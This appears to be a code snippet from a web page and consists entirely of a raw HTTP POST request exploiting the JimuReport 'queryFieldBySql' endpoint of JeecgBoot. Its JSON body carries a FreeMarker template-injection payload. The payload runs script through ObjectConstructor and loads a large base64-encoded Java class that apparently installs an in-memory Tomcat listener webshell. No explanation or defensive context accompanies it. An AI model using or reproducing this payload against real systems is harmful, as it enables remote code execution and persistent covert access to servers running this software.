+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/queryFieldBySql HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">111.22</span>:<span class="number">18088</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">131.0</span>.<span class="number">6778.86</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=<span class="number">1758269454</span>,<span class="number">1758270382</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">16172</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;sql&quot;</span>:<span class="string">&quot;call$&#123;\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;javax.script.ScriptEngineManager\&quot;).getEngineByName(\&quot;js\&quot;).eval(\&quot;classLoader=java.lang.Thread.currentThread().getContextClassLoader();try&#123;classLoader.loadClass(&#x27;org.apachen.SOAPUtils&#x27;).newInstance();&#125;catch(e)&#123;clsString=classLoader.loadClass(&#x27;java.lang.String&#x27;);bytecodeBase64=&#x27;yv66vgAAADEBewEAIGNoL3Fvcy9sb2diYWNrL3UvRW5jcnlwdGlvblV0aWxzBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADGdldENsYXNzTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAKGNoLnFvcy5sb2diYWNrLldoaXRlQmxhY2tMaXN0WHdlTGlzdGVuZXIIAAgBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADAEAEGphdmEvbGFuZy9TdHJpbmcHAA4BCpRINHNJQUFBQUFBQUFBSTFYK1hjVDF4WCtualh5eUxJSVFjUUdRVXZaUWlSWnNnSUJZdVJBc0kwZE81RUV3U3d4VHBleE5MWUVzbVJtUm1aSjI2UnQwalVwVFhlNnBrdnFMbWtMS2NnUUNpRnRDcWM1UGFmTkQvMG4rZy8wOUljMi9kNk1iRWxlT1FmbWpkNjc5M3YzZmZlNzk0M2YrOTlidHdCc3gxMkJZRG9iTzEwMFkvbmkySWlXUGhVN25zMVplbmVlcjRtY2FUMXpScGVEWHRBTkZVTGcvcFBhcEJiTGE0V3gyTUdSazNyYVV1RVMyQ3BuejhaTTNaak02MVpzMEJrUDY2ZEx1bWxWL2QwQ2pZL2xDamxybjRBckdEb21vUFFVTTdyQXlrU3VvS2RLNHlPNmNVUWJ5WFBHbnlpbXRmd3h6Y2pKMzVWSnhjcm1USUZ3NGw1RDd2UkJoY2NMQmZjeGRNT0o1d0QvRzhWemVrWmdXekN4Vk9TOWszckI2cFJ4cmpibkx3aHN1UWR2SHFXeTd3QVBudFB5dWZOeTU5VlZIbnZQcHZVSksxY3NxR2poR1RPYXBRazBESGNMTktmem1ta21pbHBHTndRQzltNnhBamM2ZWpqUlUxM2lIbzNqdXBVdEVuZGRvZ3BzNktONVppaVd0TmRvNVNiZStmTUNxMnFNYkJ5dXVkSjVVOUplWFJtMGpGeGhqRXNlUXpjbmlnV1RHWmpMVjlheUptTDlmTXdlM2JHa2wxbzV0c0JEeXpyWmh2VFp0Q3lmS2g0VWVQQ2U4RlE4eEF6Zlc3d3FRblhhZHM2dW9rMWd4YUJGWVNXMWlZb0lWNDNwVnYxR0FodURvU1dsUUIyMkkrYkZOandzMERwVzNiZlBLSTdQb2p5OVBMc08ydHpORnMyQ0R6dndpQmNOMkNuZ3plcFNMQ2x0WFBkaE56WTJjZnBSZ1NaRzA2ODdDcXVVUTEzNlEvT25mTmlEZURPQ1lNYWFIZFJqV3I1RTJMME9MTXZia3k0V0xDMVhvS2JXMTZMMlpEVmpVQjZqa05ZN1F5ZDgySTh1THlLZzJwVUpLdEdIQXc1R3I0Q1BvUjNTREFaczZZWVBUemliOW5OaFJEUDEzVHNQNkdtN2U3UXVGUFp3dHc5UDRpbDUrSVRBbWtWS1IwV0tjTFdMS2c3VktlRkkxdUFKVlJ5bUV0SWx3NkFHblNtQkI0SzE1RGl6Sk9jSWpub3hDSGFORmg2Z2h6em9aNjJldWtxdWM2eXRaQitld1pEMFBpRVFDZzdYVlh6bklqNmhZN0xMUGV2RlFYeVVleTVvcE9ManpGVkdIMldmdGFjOVlKTlpPY2RXUlZyRldrcThPai9BNk1lay95Z1RkR1RvVUs4UFdXeG93aGh5VGlrd0NYbk4wRFBKU2dQYXYwQXlodWYxbTlEaWJjcUhVOGg3a2NHNHdOckZyRlFVbVE5VHQ3clNhZDAwYzg3MUVEd2h1VGdOdzRzSm1ISml3Q0duNUdYQWsyeVR1Y0prOFJSTjk5Ukc2VnhrZFZGV3BrTHpwM3c0aTNNU24zMjB1YUNmR1NpWWxrWXh6NVhEclBrbjhTbDVtazl6ZCtwZWsxMjJaWUhkWlMyOGdNL0l1K3F6UkI3Tmw4eHNkMmwwVkNyL1JYaWFFY1pMTE9MWnk0SVozTUtPemd6MFVXa2RDeUF1WGN1ejhYMEpYNVpGOGhVUE5nbHNxQnFraW9PbGRMWXZwK2N6TlRmVVY4bnFwR2JzWXM5TExHM2I2VmcrWEgrcFZMWjExclk3dzQ3WnU2MHUwelpjeGZLUm1SS2ViNkhpdTJ3M3N0S2tzbml6emk4dW52SjcrTDZrOWdlczdSclIyZ0FDMFdYNlhuMUVQdndJUDVZcGZZMFNsSmRCYVVJMzdKdmFoNS9LYlRMNDJad2N6MkRhWW56ZGl3djRoUmNYcFVSZEJKalRlSmZTM3Evd2ErbjRHMTZ2R2J2N3NadTAxQmpXc3UvaVp3NmJvMWtxdEkvbnpIUjdkOWRnNzB6VE5EeTRSSXpSb24wZjhFWmRob0VaR3QvRUgrVDVyckJwT3ZzN0V2V2c3TndrVG5YNmNNMHA0ZXVWVnRwZXNuTDU5bTY3YTN0d2d6cDJrdUJFY3BPbDRhQjU4TGI4eXVNZDU4RTd0RHJLR3k3YU5jYWU2OEdmYWRXZHpZMXJaeno0Q3paUnNnbzRCUmVmdkRQNE9Tdmt0V2FQZSsyeGtXLzgvT096aWIrNjZDRTRyZ2xQWTJYWS82ZXI2QXY3MzcyS2pyRC96bFU4ZnBsTERmQlczQUFmbXUybjdjSnhoUTE4UDFaVjRIYlo5cHliNitpM0hWdWR4WXFqZlBOak5aOXNFek1RNGwzR0pxSGVieXRqKzIwRWsrSElOSGFsSXVFcjZMaU94eHB3QjFlcVAvanllQms5Ri9HYW5PdTdqb0VHeEpXQWNnY1h3Z0dsakdUY2ZRTUhoMXczOGZRMUhDOWplQm9maXpmNlArRWZhYnlKekpETHJ3OE9LVy9pNU9DUVd6N0xLTVRWZ0VwSEs2QUdHbW1qRExrQ2J0cmN3TmlRYXhwbmFDaGZBKzViOGtjWno5MUdKdTRKZU1wNDNtMWJSMmdjNWNMbmprZXY0L01DVTNESDNWTlFVcGQ1K1AyNGkvZElnd2Qvdzk4NXVteUsrbmg0b0lXemEzQWYxaUtHQURxeGp0WWZRajgrakdGc3dEbDhCTTh6Z1c4d3llOWdNM0cyRW1rTGNVSkVDdUlmYklXUzRtZEpYajh0MXhESFRjODhzZFl4Q2VlUXducmlxVVJZVDh3TjNLMFRyeEoxby94REFMZUl1NW54a1BqWjlMeGZTWThIZitWT1d4bC9sTE5ib0h6QXJkMHFHbFJzVXhGVUVWYjVzU0pVdFA0SG9wdUR6RDIvc2ZqOEFoMmtJbHZ0blBaenhzMHhJcEp0L2k5ZXc4ditWL2k0alhCeUNvRlVXODB2VDF5Wmdvdi9JcGZvMDBDQ0hpQkdDOFBkTE9GNVdIWm96a3ZVZnpKc2lkb2hrdUV5ZnBpSytwWFgwUnFsZm41Q3BCVnhKVnJHejFOVEgvd3JjaGUrRzdndzFEYU5xYmNqVFBJdkkzUjQ0eExqVzhHRHRySURPUW5aUVFya0g0THlGQ3AyY25VMzF4K2xSUWRwM1VQNjRxUnRMeW5aUjByMjA2ckxKbjhuNDVDMGY0M0VLaklpZkIzZnNLbnN3RGZwd2I5Z2lQUXRmSnVqU3Z6dk1BMHVtOVJWVVA0TFZjVkZGWm1VaWd0TnZocnFoUHhtcXh6MjM4eWxQS3pwdjN3TlY1TVIvN1RpQ0RsQ3piMFZvUXdWVzRadGpqWjE1OStscFArUE5DYzF0MWdLR1ZvS2ptVGdPVmtzSk0xL3V4WW1vQ3dJWWxkeWxCL3RNOEtWd2dJL1FSdVoyWFlNVUxoUHNnVTh4YmVFemNjK3JqUlNuRkp1RFZ6Wlo3KzV1QjdHYjhtTVFvOERaT3QzZGw4d1o0Vm40dmMyVzFHbmZ4U2twS3AwNFAvcnNZUXdxUThBQUE9PQgAEAEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEgATCgAPABQBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAXAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAIbGlzdGVuZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAIkxjaC9xb3MvbG9nYmFjay91L0VuY3J5cHRpb25VdGlsczsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACQBABJqYXZhL3V0aWwvSXRlcmF0b3IHACYBAA1TdGFja01hcFRhYmxlDAASABYKAAQAKQEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMACsALAoAAgAtAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAvADALACUAMQEAB2hhc05leHQBAAMoKVoMADMANAsAJwA1AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA3ADgLACcAOQEAC2dldExpc3RlbmVyAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMADsAPAoAAgA9AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYMAD8AQAoAAgBBAQAEa2V5MQEACGNoaWxkcmVuAQATTGphdmEvdXRpbC9IYXNoTWFwOwEAA2tleQEAC2NoaWxkcmVuTWFwAQAGdGhyZWFkAQASTGphdmEvbGFuZy9UaHJlYWQ7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3RocmVhZHMBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBNAQAQamF2YS9sYW5nL1RocmVhZAcATwEAEWphdmEvdXRpbC9IYXNoTWFwBwBRAQATamF2YS91dGlsL0FycmF5TGlzdAcAUwoAVAApAQAKZ2V0VGhyZWFkcwgAVgEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABYAFkKAAIAWgEAB2dldE5hbWUMAFwABgoAUABdAQAcQ29udGFpbmVyQmFja2dyb3VuZFByb2Nlc3NvcggAXwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABhAGIKAA8AYwEABnRhcmdldAgAZQEABWdldEZWDABnAFkKAAIAaAEABnRoaXMkMAgAaggARAEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7DABtAG4KAFIAbwEADWphdmEvdXRpbC9TZXQHAHELAHIAMQEAA2dldAwAdAA8CgBSAHUBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAHcAeAoABAB5AQAPamF2YS9sYW5nL0NsYXNzBwB7CgB8AF0BAA9TdGFuZGFyZENvbnRleHQIAH4BAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoMAIAAgQsAJQCCAQAVVG9tY2F0RW1iZWRkZWRDb250ZXh0CACEAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAhgCHCgBQAIgBAAh0b1N0cmluZwwAigAGCgB8AIsBABlQYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyCACNAQAfVG9tY2F0RW1iZWRkZWRXZWJhcHBDbGFzc0xvYWRlcggAjwEACXJlc291cmNlcwgAkQgAHQEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwCUAQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWDAASAJYKAJUAlwEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCZAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAmwEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24HAJ0BAAlTaWduYXR1cmUBACYoKUxqYXZhL3V0aWwvTGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAE2phdmEvbGFuZy9UaHJvd2FibGUHAKEBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAqwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwArQCuCgBQAK8BAA5nZXRDbGFzc0xvYWRlcgwAsQCHCgB8ALIMAAUABgoAAgC0AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAtgC3CgCsALgBAAtuZXdJbnN0YW5jZQwAugA4CgB8ALsMAAoABgoAAgC9AQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAvwDACgACAMEBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAwwDECgACAMUIAKUHAKQBABFqYXZhL2xhbmcvSW50ZWdlcgcAyQEABFRZUEUMAMsAqAkAygDMAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADOAM8KAHwA0AEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0gEADXNldEFjY2Vzc2libGUBAAQoWilWDADUANUKANMA1gEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADYANkKAMoA2gEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA3ADdCgDTAN4BAAdvYmplY3RzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEACWxpc3RlbmVycwEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEACmlzSW5qZWN0ZWQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KVoMAOUA5goAAgDnAQAbYWRkQXBwbGljYXRpb25FdmVudExpc3RlbmVyCADpAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABYAOsKAAIA7AEAHGdldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIAO4HAOEBABBqYXZhL3V0aWwvQXJyYXlzBwDxAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwwA8wD0CgDyAPUBABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylWDAASAPcKAFQA+AoAVACCAQAcc2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwgA+wEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsMAP0A/goAVAD/AQABaQEAAUkBAA1ldmlsQ2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEc2l6ZQEAAygpSQwBBQEGCgBUAQcBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAHQBCQoAVAEKAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBAAliYXNlNjRTdHIBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIIAREBAAdmb3JOYW1lDAETALcKAHwBFAEADGRlY29kZUJ1ZmZlcggBFgEACWdldE1ldGhvZAwBGADPCgB8ARkBABBqYXZhLnV0aWwuQmFzZTY0CAEbAQAKZ2V0RGVjb2RlcggBHQEABmRlY29kZQgBHwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uBwEhAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwEsAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBLgEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwEwCgEtACkBAAUoW0IpVgwAEgEzCgEvATQBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABIBNgoBMQE3AQAEcmVhZAEABShbQilJDAE5AToKATEBOwEABXdyaXRlAQAHKFtCSUkpVgwBPQE+CgEtAT8BAAt0b0J5dGVBcnJheQEABCgpW0IMAUEBQgoBLQFDAQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBSQFKCgACAUsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBTQoBTgDWCgFOAHUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAVEBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAVQBVQoAfAFWAQANZ2V0U3VwZXJjbGFzcwwBWAB4CgB8AVkKAVIAFAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEACnBhcmFtQ2xhenoBABJbTGphdmEvbGFuZy9DbGFzczsBAAVwYXJhbQEABm1ldGhvZAEACXRlbXBDbGFzcwcBXwEAEmdldERlY2xhcmVkTWV0aG9kcwEAHSgpW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAFoAWkKAHwBagoA0wBdAQAGZXF1YWxzDAFtAIEKAA8BbgEAEWdldFBhcmFtZXRlclR5cGVzAQAUKClbTGphdmEvbGFuZy9DbGFzczsMAXABcQoA0wFyCgCcABQBAApnZXRNZXNzYWdlDAF1AAYKAJoBdgoAlQAUAQAIPGNsaW5pdD4KAAIAKQAhAAIABAAAAAAADgABAAUABgABAAcAAAAQAAEAAQAAAAQTAAmwAAAAAAABAAoABgACAAsAAAAEAAEADQAHAAAAFwADAAEAAAALuwAPWRMAEbcAFbAAAAAAAAEAEgAWAAEABwAAANgAAwAFAAAANiq3ACoqtgAuTCu5ADIBAE0suQA2AQCZABssuQA6AQBOKi23AD46BCotGQS2AEKn/+KnAARMsQABAAQAMQA0ABgABAAZAAAAJgAJAAAAJAAEACYACQAnACAAKAAnACkALgAqADEALQA0ACsANQAwABoAAAAqAAQAJwAHABsAHAAEACAADgAdABwAAwAJACgAHgAfAAEAAAA2ACAAIQAAACIAAAAMAAEACQAoAB4AIwABACgAAAAaAAT/ABAAAwcAAgcAJQcAJwAA+QAgQgcAGAAAAQArACwAAwAHAAAC2AADAA4AAAF5uwBUWbcAVUwSUBJXuABbwABOwABOTQFOLDoEGQS+NgUDNgYVBhUFogFBGQQVBjI6BxkHtgBeEmC2AGSZALMtxwCvGQcSZrgAaRJruABpEmy4AGnAAFI6CBkItgBwuQBzAQA6CRkJuQA2AQCZAIAZCbkAOgEAOgoZCBkKtgB2Emy4AGnAAFI6CxkLtgBwuQBzAQA6DBkMuQA2AQCZAE0ZDLkAOgEAOg0ZCxkNtgB2Ti3GABottgB6tgB9En+2AGSZAAsrLbkAgwIAVy3GABottgB6tgB9EoW2AGSZAAsrLbkAgwIAV6f/r6f/fKcAdxkHtgCJxgBvGQe2AIm2AHq2AIwSjrYAZJoAFhkHtgCJtgB6tgCMEpC2AGSZAEkZB7YAiRKSuABpEpO4AGlOLcYAGi22AHq2AH0Sf7YAZJkACystuQCDAgBXLcYAGi22AHq2AH0ShbYAZJkACystuQCDAgBXhAYBp/6+pwAPOgS7AJVZGQS3AJi/K7AAAQAYAWgBawAYAAQAGQAAAHIAHAAAADMACAA0ABYANQAYADcAMQA5AEIAOgBYAD0AdwA+AIgAQQCnAEIArwBDAMIARADKAEYA3QBHAOUASADoAEkA6wBKAO4ATAEcAE0BLABOAT8ATwFHAFABWgBRAWIANwFoAFYBawBUAW0AVQF3AFcAGgAAAGYACgCnAD4AQwAcAA0AiABgAEQARQALAHcAcQBGABwACgBYAJMARwBFAAgAMQExAEgASQAHAW0ACgBKAEsABAAAAXkAIAAhAAAACAFxAB4AHwABABYBYwBMAE0AAgAYAWEAHQAcAAMAIgAAAAwAAQAIAXEAHgAjAAEAKAAAAE8ADv8AIwAHBwACBwAlBwBOBwAEBwBOAQEAAP4AQAcAUAcAUgcAJ/4ALwcABAcAUgcAJ/wANQcABPoAGvgAAvkAAgItKvoAGvgABUIHABgLAAsAAAAIAAMAmgCcAJ4AnwAAAAIAoAACADsAPAABAAcAAAFwAAYACAAAAIcBTbgAsLYAiU4txwALK7YAerYAs04tKrYAtbYAubYAvE2nAGQ6BCq2AL64AMK4AMY6BRKsEscGvQB8WQMSyFNZBLIAzVNZBbIAzVO2ANE6BhkGBLYA1xkGLQa9AARZAxkFU1kEA7gA21NZBRkFvrgA21O2AN/AAHw6BxkHtgC8TacABToFLLAAAgAVACEAJAAYACYAgACDAKIAAwAZAAAAPgAPAAAAXAACAF0ACQBeAA0AXwAVAGIAIQBsACQAYwAmAGUAMgBmAFAAZwBWAGgAegBpAIAAawCDAGoAhQBtABoAAABSAAgAMgBOAKMApAAFAFAAMAClAKYABgB6AAYApwCoAAcAJgBfAEoASwAEAAAAhwAgACEAAAAAAIcAHQAcAAEAAgCFABsAHAACAAkAfgCpAKoAAwAoAAAAKwAE/QAVBwAEBwCsTgcAGP8AXgAFBwACBwAEBwAEBwCsBwAYAAEHAKL6AAEAAQA/AEAAAgAHAAABFgAHAAcAAABwKisstgB6tgB9tgDomQAEsSsS6gS9AHxZAxIEUwS9AARZAyxTuADtV6cAR04rEu+4AFvAAPDAAPA6BBkEuAD2OgW7AFRZGQW3APk6BhkGLLYA+lcrEvwEvQB8WQMS8FMEvQAEWQMZBrYBAFO4AO1XsQABABAAKAArABgAAwAZAAAALgALAAAAcQAPAHIAEAB1ACgAfgArAHYALAB3ADoAeABBAHkATAB6AFMAfQBvAH8AGgAAAEgABwA6ADUA4ADhAAQAQQAuAOIAHwAFAEwAIwDjAOQABgAsAEMASgBLAAMAAABwACAAIQAAAAAAcAAdABwAAQAAAHAAGwAcAAIAKAAAAAoAAxBaBwAY+wBDAAsAAAAEAAEAGAABAOUA5gACAAcAAADxAAMABwAAAEkrEu+4AFvAAPDAAPBOLbgA9joEuwBUWRkEtwD5OgUDNgYVBhkFtgEIogAfGQUVBrYBC7YAerYAfSy2AGSZAAUErIQGAaf/3QOsAAAAAwAZAAAAIgAIAAAAggANAIMAEwCEAB4AhQArAIYAPwCHAEEAhQBHAIoAGgAAAEgABwAhACYBAQECAAYAAABJACAAIQAAAAAASQAdABwAAQAAAEkBAwEEAAIADQA8AOAA4QADABMANgDiAB8ABAAeACsA4wDkAAUAKAAAACAAA/8AIQAHBwACBwAEBwAPBwDwBwAlBwBUAQAAH/oABQALAAAABAABABgACAC/AMAAAgAHAAABBQAGAAQAAABvEwESuAEVTCsTARcEvQB8WQMSD1O2ARortgC8BL0ABFkDKlO2AN/AAMjAAMiwTRMBHLgBFUwrEwEeA70AfLYBGgEDvQAEtgDfTi22AHoTASAEvQB8WQMSD1O2ARotBL0ABFkDKlO2AN/AAMjAAMiwAAEAAAAsAC0AGAAEABkAAAAaAAYAAACQAAcAkQAtAJIALgCTADUAlABJAJUAGgAAADQABQAHACYBDACoAAEASQAmAQ0AHAADAC4AQQEOAEsAAgAAAG8BDwEEAAAANQA6AQwAqAABACIAAAAWAAIABwAmAQwBEAABADUAOgEMARAAAQAoAAAABgABbQcAGAALAAAACgAEASIAnACeAJoACQDDAMQAAgAHAAAA1AAEAAYAAAA+uwEtWbcBMky7AS9ZKrcBNU27ATFZLLcBOE4RAQC8CDoELRkEtgE8WTYFmwAPKxkEAxUFtgFAp//rK7YBRLAAAAADABkAAAAeAAcAAACaAAgAmwARAJwAGgCdACEAnwAtAKAAOQCiABoAAAA+AAYAAAA+ASMApAAAAAgANgEkASUAAQARAC0BJgEnAAIAGgAkASgBKQADACEAHQEqAKQABAAqABQBKwECAAUAKAAAABwAAv8AIQAFBwDIBwEtBwEvBwExBwDIAAD8ABcBAAsAAAAEAAEADQAIAGcAWQACAAcAAABXAAIAAwAAABEqK7gBTE0sBLYBTywqtgFQsAAAAAIAGQAAAA4AAwAAAKYABgCnAAsAqAAaAAAAIAADAAAAEQFFABwAAAAAABEBRgEEAAEABgALAUcBSAACAAsAAAAEAAEAGAAIAUkBSgACAAcAAADHAAMABAAAACgqtgB6TSzGABksK7YBV04tBLYBTy2wTiy2AVpNp//puwFSWSu3AVu/AAEACQAVABYBUgAEABkAAAAmAAkAAACsAAUArQAJAK8ADwCwABQAsQAWALIAFwCzABwAtAAfALYAGgAAADQABQAPAAcBRwFIAAMAFwAFAEoBUwADAAAAKAFFABwAAAAAACgBRgEEAAEABQAjAKcAqAACACIAAAAMAAEABQAjAKcBEAACACgAAAANAAP8AAUHAHxQBwFSCAALAAAABAABAVIAKABYAFkAAgAHAAAAQgAEAAIAAAAOKisDvQB8A70ABLgA7bAAAAACABkAAAAGAAEAAAC6ABoAAAAWAAIAAAAOAVwAHAAAAAAADgFdAQQAAQALAAAACAADAJwAmgCeACkAWADrAAIABwAAAhcAAwAJAAAAyirBAHyZAAoqwAB8pwAHKrYAejoEAToFGQQ6BhkFxwBkGQbGAF8sxwBDGQa2AWs6BwM2CBUIGQe+ogAuGQcVCDK2AWwrtgFvmQAZGQcVCDK2AXO+mgANGQcVCDI6BacACYQIAaf/0KcADBkGKyy2ANE6Baf/qToHGQa2AVo6Bqf/nRkFxwAMuwCcWSu3AXS/GQUEtgDXKsEAfJkAGhkFAS22AN+wOge7AJVZGQe2AXe3AXi/GQUqLbYA37A6B7sAlVkZB7YBd7cBeL8AAwAlAHIAdQCcAJwAowCkAJoAswC6ALsAmgADABkAAABuABsAAAC+ABQAvwAXAMEAGwDCACUAxAApAMYAMADHADsAyABWAMkAXQDKAGAAxwBmAM0AaQDOAHIA0gB1ANAAdwDRAH4A0gCBANQAhgDVAI8A1wCVANgAnADaAKQA2wCmANwAswDgALsA4QC9AOIAGgAAAHoADAAzADMBAQECAAgAMAA2AV4BXwAHAHcABwBKAWAABwCmAA0ASgFhAAcAvQANAEoBYQAHAAAAygFFABwAAAAAAMoBXQEEAAEAAADKAWIBYwACAAAAygFkAOEAAwAUALYApwCoAAQAFwCzAWUApgAFABsArwFmAKgABgAoAAAALwAODkMHAHz+AAgHAHwHANMHAHz9ABcHAWcBLPkABQIIQgcAnAsNVAcAmg5HBwCaAAsAAAAIAAMAnACeAJoACAF5ABYAAQAHAAAAJQACAAAAAAAJuwACWbcBelexAAA